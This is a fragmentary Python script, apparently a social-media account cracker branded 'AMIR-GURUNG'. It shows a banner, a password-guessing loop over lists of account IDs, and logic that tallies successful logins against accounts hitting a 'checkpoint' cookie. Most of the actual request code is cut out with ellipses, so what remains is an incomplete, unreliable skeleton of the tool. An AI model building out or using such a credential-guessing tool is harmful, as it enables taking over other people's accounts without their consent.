...
#Chnge Name 
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mAMIR-GURUNG]')
...
/_/ |_/_/_/_/_/_/    JUST FEEL THE POWER🥺❤️                                      '''
...
def passwrd():
	...
	print(f'                    {m}A {k}M {h}R {u}I {b}R {u}  ★  {b}G {u}U {h} R{k} U{m} N{b} G{b}')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}AMIR-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('  [red]     ✨ GURUNG-CHECKPOINT ✨ [red]'))
				...
				cetak(nel('[green]      ❤️✨ AMIR-OK ❤️✨[green]')) 
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[purple]      😭GURUNG-IS-HERE🤣[purple]')) 
